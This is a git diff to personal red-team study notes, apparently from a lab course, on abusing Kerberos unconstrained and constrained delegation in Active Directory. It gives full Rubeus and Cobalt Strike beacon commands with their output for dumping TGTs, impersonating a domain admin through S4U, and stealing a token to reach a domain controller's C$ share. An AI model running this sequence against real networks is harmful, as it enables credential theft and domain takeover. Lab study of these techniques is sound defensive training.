@@ -243,11 +243,19 @@ Domain Controllers are _**always permitted**_ for unconstrained delegation.
 
 ### Compromise Techniques/Scenarios
 
+{% hint style="info" %}
+USE THIS COMMAND DURING OPS!&#x20;
+
+<mark style="color:yellow;">`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage`</mark>.
+{% endhint %}
+
 If we compromise <mark style="color:yellow;">`WEB$`</mark> and wait or socially engineer a privileged user to interact with it, we can steal their cached TGT.
 
 Interaction can be via any Kerberos service, so something as simple as <mark style="color:yellow;">`dir \\web\c$`</mark> is enough.
 
 <mark style="color:yellow;">`rubeus`</mark> <mark style="color:yellow;">`triage`</mark> is _<mark style="color:green;">**capable of showing all tickets that are currently cached**</mark>_.
+
+<figure><img src="../.gitbook/assets/image (302).png" alt=""><figcaption></figcaption></figure>
 
 **TGTs can be identified by the&#x20;**<mark style="color:yellow;">**`krbtgt`**</mark>**&#x20;service:**
 
@@ -349,8 +357,8 @@ beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Rele
 
 **Where:**
 
-* `DC-2` is the "_**target**_".
-* `WEB` is the "_**listener**_".
+* <mark style="color:yellow;">`DC-2`</mark> is the "_**target**_".
+* <mark style="color:yellow;">`WEB`</mark> is the "_**listener**_".
 
 `Rubeus` will then capture the ticket.
 
@@ -368,3 +376,196 @@ doIFuj[...]lDLklP
 ```
 
 _**Machine TGTs are leveraged slightly differently**_ - see the _**S4U2Self Abuse**_ module.  To stop Rubeus, use the <mark style="color:yellow;">`jobs`</mark> and <mark style="color:yellow;">`jobkill`</mark> commands.
+
+## Constrained Delegation
+
+Constrained delegation was later introduced with Windows Server 2003 as a _**safer**_ means for services to perform Kerberos delegation.
+
+Essentially, <mark style="color:red;">it aims to</mark> <mark style="color:red;"></mark>_<mark style="color:red;">**restrict**</mark>_ <mark style="color:red;"></mark><mark style="color:red;">the</mark> <mark style="color:red;"></mark>_<mark style="color:red;">**services**</mark>_ _<mark style="color:red;">**to which the server can act on behalf of a user**</mark>_. <mark style="color:yellow;">It no longer allows the server to cache the TGTs of other users</mark>, <mark style="color:yellow;">but allows it to requests a TGS for another user with its own TGT</mark>.
+
+<figure><img src="../.gitbook/assets/image (300).png" alt=""><figcaption></figcaption></figure>
+
+As we can see in <mark style="color:yellow;">`SQL-2`</mark>'s case, this server can act on behalf of any user to the <mark style="color:yellow;">`cifs`</mark> service on <mark style="color:yellow;">`DC-2`</mark>.&#x20;
+
+* `CIFS` is quite powerful as it allows you to list file shares and transfer files
+
+### Finding Computers Configured for Constrained Delegation
+
+In order to <mark style="color:green;">accomplish this</mark>, <mark style="color:green;">we can search for those whose</mark> <mark style="color:yellow;">`msds-allowedtodelegateto`</mark> attribute is _<mark style="color:green;">**not**</mark>_ <mark style="color:green;"></mark><mark style="color:green;">empty</mark>:
+
+```
+beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json
+
+[*] TOTAL NUMBER OF SEARCH RESULTS: 1
+[
+  {
+    "dnshostname": "sql-2.dev.cyberbotic.io",
+    "samaccountname": "SQL-2$",
+    "msds-allowedtodelegateto": [
+      "cifs/dc-2.dev.cyberbotic.io/dev.cyberbotic.io",
+      "cifs/dc-2.dev.cyberbotic.io",
+      "cifs/DC-2",
+      "cifs/dc-2.dev.cyberbotic.io/DEV",
+      "cifs/DC-2/DEV"
+    ]
+  }
+]
+```
+
+{% hint style="info" %}
+:eyes:
+
+Constrained delegation can be configured on user accounts as well as computer accounts. _**Make sure you search for both**_.
+{% endhint %}
+
+:warning: _**In order to do this, I believe you just swap out****&#x20;****`computer`****&#x20;****for****&#x20;****`user`****&#x20;****in the****&#x20;****`objectCategory`****&#x20;****object. I need to look further into this however.**_
+
+### Performing Delegation
+
+_**In order to perform the delegation**_, _**we need the TGT of the principal**_ (computer or user) _**trusted for delegation**_.&#x20;
+
+<mark style="color:green;">**The most**</mark><mark style="color:green;">**&#x20;**</mark>_<mark style="color:green;">**direct**</mark>_<mark style="color:green;">**&#x20;**</mark><mark style="color:green;">**way is to extract the TGT**</mark>**&#x20;using&#x20;**<mark style="color:yellow;">**`rubeus`**</mark>**'&#x20;**<mark style="color:yellow;">**`dump`**</mark>**&#x20;command:**
+
+```
+beacon> run hostname
+sql-2
+
+beacon> getuid
+[*] You are NT AUTHORITY\SYSTEM (admin)
+
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
+ --------------------------------------------------------------------------------------------------------------- 
+ | LUID    | UserName                    | Service                                       | EndTime              |
+ --------------------------------------------------------------------------------------------------------------- 
+| 0x3e4    | sql-2$ @ DEV.CYBERBOTIC.IO  | krbtgt/DEV.CYBERBOTIC.IO                      | 9/6/2022 7:06:50 PM |
+
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
+
+    ServiceName              :  krbtgt/DEV.CYBERBOTIC.IO
+    ServiceRealm             :  DEV.CYBERBOTIC.IO
+    UserName                 :  SQL-2$
+    UserRealm                :  DEV.CYBERBOTIC.IO
+    StartTime                :  9/6/2022 9:06:50 AM
+    EndTime                  :  9/6/2022 7:06:50 PM
+    RenewTill                :  9/13/2022 9:06:50 AM
+    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+    KeyType                  :  aes256_cts_hmac_sha1
+    Base64(key)              :  pj1tbiijFCGHkM6S58ShgxxPi8FvA1UB5liBqrSWPCg=
+    Base64EncodedTicket   :
+
+doIFpD[...]MuSU8=
+```
+
+{% hint style="info" %}
+&#x20;You can also request one with Rubeus <mark style="color:yellow;">`asktgt`</mark> if you have **NTLM** or **AES** hashes.
+{% endhint %}
+
+### Performing `S4U2Self` and `S4U2Proxy`
+
+With the TGT, perform an `S4U` request to obtain a usable TGS for `CIFS` on `DC-2`.
+
+{% hint style="warning" %}
+Remember, <mark style="color:green;">we can impersonate any user in the domain</mark>, <mark style="color:yellow;">but we want someone who we know is a local admin on the target machine</mark>.
+{% endhint %}
+
+In this case, a domain admin makes the most sense (since we're on a Domain Controller).
+
+**The following will perform an&#x20;**<mark style="color:yellow;">**`S4U2Self`**</mark>**&#x20;and&#x20;**<mark style="color:yellow;">**`S4U2Proxy`**</mark>**:**
+
+```
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /user:sql-2$ /ticket:doIFLD[...snip...]MuSU8= /nowrap
+
+[*] Action: S4U
+
+[*] Building S4U2self request for: 'SQL-2$@DEV.CYBERBOTIC.IO'
+[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.122.10)
+[*] Sending S4U2self request to 10.10.122.10:88
+[+] S4U2self success!
+[*] Got a TGS for 'nlamb' to 'SQL-2$@DEV.CYBERBOTIC.IO'
+[*] base64(ticket.kirbi):
+
+      doIFnD[...]FMLTIk
+
+[*] Impersonating user 'nlamb' to target SPN 'cifs/dc-2.dev.cyberbotic.io'
+[*] Building S4U2proxy request for service: 'cifs/dc-2.dev.cyberbotic.io'
+[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.122.10)
+[*] Sending S4U2proxy request to domain controller 10.10.122.10:88
+[+] S4U2proxy success!
+[*] base64(ticket.kirbi) for SPN 'cifs/dc-2.dev.cyberbotic.io':
+
+      doIGaD[...]ljLmlv    <----------- Use this ticket
+```
+
+**Syntax:**
+
+* <mark style="color:yellow;">`/impersonateuser`</mark> is the _**user**_ we want to _**impersonate**_.
+* <mark style="color:yellow;">`/msdsspn`</mark> is the _**service principal name**_ (SPN) that `SQL-2` is _**allowed to delegate to**_.
+* <mark style="color:yellow;">`/user`</mark> is the _**principal**_ _**allowed**_ to _**perform the delegation**_.
+* <mark style="color:yellow;">`/ticket`</mark> is the _**TGT**_ for <mark style="color:yellow;">`/user`</mark>.
+
+{% hint style="success" %}
+_**The second ticket (which is the****&#x20;****`S4U2Proxy`****&#x20;****ticket) is the one we want for the next steps.**_
+{% endhint %}
+
+### Authenticating via `S4U2Proxy` Ticket and Stealing Ticket
+
+**Grab the final&#x20;**<mark style="color:yellow;">**`S4U2Proxy`**</mark>**&#x20;ticket and pass it into a new logon session:**
+
+```
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGaD[...]ljLmlv
+
+[*] Using DEV\nlamb:FakePass
+
+[*] Showing process : False
+[*] Username        : nlamb
+[*] Domain          : DEV
+[*] Password        : FakePass
+[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 5540
+[+] Ticket successfully imported!
+[+] LUID            : 0x3d3194
+
+beacon> steal_token 5540
+
+beacon> ls \\dc-2.dev.cyberbotic.io\c$
+
+ Size     Type    Last Modified         Name
+ ----     ----    -------------         ----
+          dir     08/15/2022 15:44:08   $Recycle.Bin
+          dir     08/10/2022 04:55:17   $WinREAgent
+          dir     08/10/2022 05:05:53   Boot
+          dir     08/18/2021 23:34:55   Documents and Settings
+          dir     08/19/2021 06:24:49   EFI
+          dir     08/15/2022 16:09:55   inetpub
+          dir     05/08/2021 08:20:24   PerfLogs
+          dir     08/24/2022 10:51:51   Program Files
+          dir     08/10/2022 04:06:16   Program Files (x86)
+          dir     09/05/2022 17:17:48   ProgramData
+          dir     08/15/2022 15:23:23   Recovery
+          dir     08/16/2022 12:37:38   Shares
+          dir     09/05/2022 12:03:43   System Volume Information
+          dir     08/15/2022 15:24:39   Users
+          dir     09/05/2022 17:09:56   Windows
+ 427kb    fil     08/10/2022 05:00:07   bootmgr
+ 1b       fil     05/08/2021 08:14:33   BOOTNXT
+ 1kb      fil     08/15/2022 16:16:13   dc-2.dev.cyberbotic.io_sub-ca.req
+ 12kb     fil     09/05/2022 07:25:58   DumpStack.log
+ 12kb     fil     09/06/2022 09:04:41   DumpStack.log.tmp
+ 384mb    fil     09/06/2022 09:04:41   pagefile.sys
+```
+
+As we can see, we are using the <mark style="color:yellow;">`S4U2Proxy`</mark> ticket, using <mark style="color:yellow;">`createnetonly`</mark> method to spawn <mark style="color:yellow;">`cmd.exe`</mark> using our new <mark style="color:yellow;">`S4U2Proxy`</mark> ticket, we can then steal the token by obtaining the <mark style="color:yellow;">`ProcessID`</mark> and list <mark style="color:yellow;">`dc-2`</mark>'s <mark style="color:yellow;">`c$`</mark> share.&#x20;
+
+#### Debugging
+
+{% hint style="warning" %}
+Be sure to always use the FQDN. Otherwise, you will likely see `1326` errors.
+
+```
+beacon> ls \\dc-2\c$
+[-] could not open \\dc-2\c$\*: 1326 - ERROR_LOGON_FAILURE
+```
+{% endhint %}
+
+## Alternate Service Name
+
